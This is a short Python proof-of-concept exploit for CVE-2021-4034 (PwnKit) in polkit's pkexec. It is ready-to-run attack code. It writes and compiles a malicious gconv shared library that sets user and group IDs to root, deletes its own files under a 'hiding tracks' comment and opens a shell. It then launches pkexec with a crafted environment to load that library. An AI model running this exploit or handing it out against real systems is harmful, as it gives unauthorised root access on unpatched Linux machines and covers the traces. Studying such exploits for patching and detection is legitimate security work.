#!/usr/bin/env python3
#CVE-2021-4034
#Ravindu Wickramasinghe (@RavinduBW)
#Original POC https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
#Original C code created by arthepsy - https://github.com/arthepsy/CVE-2021-4034
#pk for brevity sake

import os
from ctypes import *
from ctypes.util import find_library

#hiding tracks...
so='''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv() {}
void gconv_init() {
    setuid(0);setgid(0);seteuid(0);setegid(0);
    system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pk'; /bin/sh");
    exit(0);
}
'''
def main():
    os.system("mkdir -p 'GCONV_PATH=.' pk ; touch 'GCONV_PATH=./pk'; chmod a+x 'GCONV_PATH=./pk'")
    os.system("echo 'module UTF-8// pk// pk 2' > pk/gconv-modules")
    f=open("pk/pk.c","w") ; f.write(so) ;f.close()
    os.system("gcc pk/pk.c -o pk/pk.so -shared -fPIC")
    envi=[b"pk", b"PATH=GCONV_PATH=.",b"CHARSET=pk",b"SHELL=pk",None]
    env=(c_char_p * len(envi))() ;env[:]=envi
    libc = CDLL(find_library('c'))
    libc.execve(b'/usr/bin/pkexec',c_char_p(None) ,env)
main()